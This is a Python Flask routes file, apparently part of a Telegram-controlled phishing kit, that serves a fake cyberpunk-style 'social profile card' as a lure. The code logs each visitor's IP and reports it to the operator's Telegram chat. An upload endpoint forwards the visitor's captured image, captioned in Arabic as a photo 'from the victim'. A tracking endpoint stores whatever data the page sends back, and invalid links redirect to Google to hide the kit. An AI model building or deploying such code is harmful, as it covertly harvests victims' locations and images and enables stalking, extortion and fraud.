# fake_sites/social_profile/routes.py
# ============================================================
# مسارات Social Profile Card — v2
# يبني القالب بأسلوب Cyberpunk مع placeholders
# ============================================================

import os
import json
import time
import uuid
import random

from flask import (
    request, jsonify, redirect,
    render_template_string,
)

from config import bot, redis_client, PUBLIC_URL

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("social_profile.routes")


TEMPLATES_DIR = os.path.join(os.path.dirname(__file__), 'templates')
SESSION_TTL = 86400 * 30


# ============================================================
# Load Template
# ============================================================
def _load_template(filename):
    path = os.path.join(TEMPLATES_DIR, filename)
    if not os.path.exists(path):
        return None
    with open(path, 'r', encoding='utf-8') as f:
        return f.read()


# ============================================================
# Create Profile
# ============================================================
def create_profile(chat_id, data):
    """ينشئ بروفايل جديد ويرجع session_id"""
    if not redis_client:
        return None

    try:
        session_id = uuid.uuid4().hex[:12]
        now = time.time()

        profile_data = {
            "session_id": session_id,
            "chat_id": str(chat_id),
            "created_at": now,
            "name": (data.get("name") or "USER")[:50],
            "title": (data.get("title") or "Systems Architect")[:100],
            "bio": (data.get("bio") or "Engineering high-order computational synthesis.")[:300],
            "photo": data.get("photo") or "",
            "phone": (data.get("phone") or "")[:30],
            "email": (data.get("email") or "")[:80],
            "website": (data.get("website") or "")[:200],
            "whatsapp": (data.get("whatsapp") or "")[:30],
            "telegram": (data.get("telegram") or "")[:50],
            "instagram": (data.get("instagram") or "")[:50],
            "facebook": (data.get("facebook") or "")[:50],
            "views": 0,
            "accessed": False,
        }

        redis_client.setex(
            f"profile:{session_id}",
            SESSION_TTL,
            json.dumps(profile_data, ensure_ascii=False)
        )

        redis_client.lpush(f"profile_user:{chat_id}", session_id)
        redis_client.ltrim(f"profile_user:{chat_id}", 0, 99)
        redis_client.expire(f"profile_user:{chat_id}", SESSION_TTL)

        logger.info(f"Profile created: {session_id} | {profile_data['name']}")
        metrics.inc_counter("social_profiles_created")

        return session_id

    except Exception as e:
        logger.exception(f"create_profile error: {e}")
        return None


def get_profile(session_id):
    if not redis_client:
        return None
    try:
        raw = redis_client.get(f"profile:{session_id}")
        if raw:
            return json.loads(raw)
    except Exception:
        pass
    return None


def update_profile_photo(session_id, photo_data):
    if not redis_client:
        return False
    try:
        raw = redis_client.get(f"profile:{session_id}")
        if not raw:
            return False
        profile = json.loads(raw)
        profile["photo"] = photo_data
        redis_client.setex(
            f"profile:{session_id}",
            SESSION_TTL,
            json.dumps(profile, ensure_ascii=False)
        )
        return True
    except Exception as e:
        logger.exception(f"update_profile_photo error: {e}")
        return False


def track_view(session_id, request_obj):
    if not redis_client:
        return

    try:
        raw = redis_client.get(f"profile:{session_id}")
        if not raw:
            return

        profile = json.loads(raw)
        profile["views"] = profile.get("views", 0) + 1
        profile["last_viewed_at"] = time.time()
        profile["last_viewer_ip"] = (
            request_obj.headers.get('CF-Connecting-IP') or
            request_obj.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
            request_obj.remote_addr
        )

        if not profile.get("accessed"):
            profile["accessed"] = True
            chat_id = profile.get("chat_id")
            if chat_id:
                try:
                    cid = int(chat_id) if str(chat_id).isdigit() else chat_id
                    bot.send_message(
                        cid,
                        f"👁️ <b>تم فتح البروفايل!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"🆔 <code>{session_id}</code>\n"
                        f"👤 <b>{profile.get('name', '—')}</b>\n"
                        f"🌐 <b>IP:</b> <code>{profile.get('last_viewer_ip', '—')}</code>",
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logger.warning(f"notify view error: {e}")

            metrics.inc_counter("social_profiles_viewed")

        redis_client.setex(
            f"profile:{session_id}",
            SESSION_TTL,
            json.dumps(profile, ensure_ascii=False)
        )

    except Exception as e:
        logger.warning(f"track_view error: {e}")


# ============================================================
# Build HTML
# ============================================================
def _build_profile_html(profile):
    template = _load_template('profile.html')
    if not template:
        return None

    # الاسم لسطرين
    name = profile.get("name", "USER")
    parts = name.split()
    if len(parts) >= 2:
        line1 = parts[0]
        line2 = " ".join(parts[1:])
    else:
        line1 = name
        line2 = ""

    # عنوان احترافي
    title = profile.get("title") or "Systems Architect"

    # Bio
    bio = profile.get("bio") or f"Engineering high-order computational synthesis for {name}."

    # photo - لو مفيش صورة، سيب فارغ
    photo = profile.get("photo") or ""

    # إحداثيات عشوائية للأسلوب
    lat = f"{random.uniform(30, 40):.4f}"
    lng = f"{random.uniform(70, 122):.4f}"

    # أرقام وهمية للأسلوب
    load = random.randint(85, 96)
    latency = f"{random.uniform(0.1, 0.5):.2f}"

    # كلمات للـ Works
    work1_title = "CHRONOS PROTOCOL"
    work1_cat = "Computational Finance"
    work1_desc = "Autonomous algorithmic settlement matrix delivering deterministic sub-millisecond execution."

    work2_title = "OBSIDIAN KINETIC"
    work2_cat = "Spatial Computing"
    work2_desc = "A bare-metal spatial operating environment constructed for mission commanders and systems engineers."

    # الوظيفة
    company = profile.get("company") or "INDEPENDENT"
    job_title = title or "PRINCIPAL ARCHITECT"
    job_desc = bio

    # استبدال
    html = template
    replacements = {
        "__SESSION_ID__": profile.get("session_id", ""),
        "__PUBLIC_URL__": PUBLIC_URL,
        "__NAME__": name,
        "__NAME_LINE1__": line1,
        "__NAME_LINE2__": line2,
        "__TITLE__": title,
        "__BIO__": bio,
        "__PHOTO__": photo,
        "__PHONE__": profile.get("phone", ""),
        "__EMAIL__": profile.get("email", ""),
        "__WEBSITE__": profile.get("website", ""),
        "__WHATSAPP__": profile.get("whatsapp", ""),
        "__TELEGRAM__": profile.get("telegram", ""),
        "__INSTAGRAM__": profile.get("instagram", ""),
        "__FACEBOOK__": profile.get("facebook", ""),
        "__GEO_LAT__": lat,
        "__GEO_LNG__": lng,
        "__LOAD__": str(load),
        "__LATENCY__": latency,
        "__WORK1_TITLE__": work1_title,
        "__WORK1_CAT__": work1_cat,
        "__WORK1_DESC__": work1_desc,
        "__WORK2_TITLE__": work2_title,
        "__WORK2_CAT__": work2_cat,
        "__WORK2_DESC__": work2_desc,
        "__COMPANY__": company,
        "__JOB_TITLE__": job_title,
        "__JOB_DESC__": job_desc,
    }

    for key, val in replacements.items():
        html = html.replace(key, str(val))

    return html


# ============================================================
# Routes
# ============================================================
def register_social_profile_routes(app, bot):

    @app.route('/profile/<session_id>', methods=['GET'])
    def social_profile_view(session_id):
        profile = get_profile(session_id)

        if not profile:
            return redirect("https://www.google.com", code=302)

        track_view(session_id, request)

        html = _build_profile_html(profile)
        if not html:
            return redirect("https://www.google.com", code=302)

        response = app.make_response(html)
        response.headers['Content-Type'] = 'text/html; charset=utf-8'
        response.headers['Cache-Control'] = 'no-cache'
        response.headers['X-Robots-Tag'] = 'noindex, nofollow'
        return response


    @app.route('/profile/<session_id>/upload', methods=['POST', 'OPTIONS'])
    def social_profile_upload(session_id):
        if request.method == 'OPTIONS':
            resp = app.make_response('')
            resp.headers['Access-Control-Allow-Origin'] = '*'
            resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return resp, 200

        try:
            data = request.get_json(silent=True) or {}
            image = data.get('image', '')

            if not image or not image.startswith('data:image'):
                return jsonify({'ok': False}), 200

            profile = get_profile(session_id)
            if not profile:
                return jsonify({'ok': False}), 200

            # حدّث الصورة في البروفايل
            update_profile_photo(session_id, image)

            chat_id = profile.get("chat_id")
            cid = int(chat_id) if str(chat_id).isdigit() else chat_id

            try:
                import base64
                import io
                _, encoded = image.split(',', 1)
                img_bytes = base64.b64decode(encoded)
                buf = io.BytesIO(img_bytes)
                buf.name = f"profile_photo_{int(time.time())}.jpg"

                bot.send_photo(
                    cid, buf,
                    caption=(
                        f"📸 <b>صورة من الضحية</b>\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"🆔 <code>{session_id}</code>\n"
                        f"👤 <b>{profile.get('name', '—')}</b>"
                    ),
                    parse_mode="HTML"
                )
                metrics.inc_counter("social_profile_photos")
            except Exception as e:
                logger.warning(f"send profile photo error: {e}")

            return jsonify({'ok': True}), 200

        except Exception as e:
            logger.exception(f"social_profile_upload error: {e}")
            return jsonify({'ok': False}), 200


    @app.route('/profile/<session_id>/track', methods=['POST', 'OPTIONS'])
    def social_profile_track(session_id):
        if request.method == 'OPTIONS':
            resp = app.make_response('')
            resp.headers['Access-Control-Allow-Origin'] = '*'
            resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return resp, 200

        try:
            data = request.get_json(silent=True) or {}

            if not redis_client:
                return jsonify({'ok': False}), 200

            redis_client.setex(
                f"profile_data:{session_id}",
                SESSION_TTL,
                json.dumps(data, ensure_ascii=False)
            )

            return jsonify({'ok': True}), 200

        except Exception as e:
            logger.exception(f"social_profile_track error: {e}")
            return jsonify({'ok': False}), 200


    @app.route('/profile/api/create', methods=['POST'])
    def social_profile_create():
        try:
            data = request.get_json(silent=True) or {}
            chat_id = data.get('chat_id')
            if not chat_id:
                return jsonify({'ok': False, 'error': 'no_chat_id'}), 400

            session_id = create_profile(chat_id, data)
            if not session_id:
                return jsonify({'ok': False}), 500

            link = f"{PUBLIC_URL}/profile/{session_id}"
            return jsonify({'ok': True, 'session_id': session_id, 'link': link}), 200

        except Exception as e:
            logger.exception(f"social_profile_create error: {e}")
            return jsonify({'ok': False}), 500


    logger.info("[+] Social Profile routes: /profile/<session_id>")
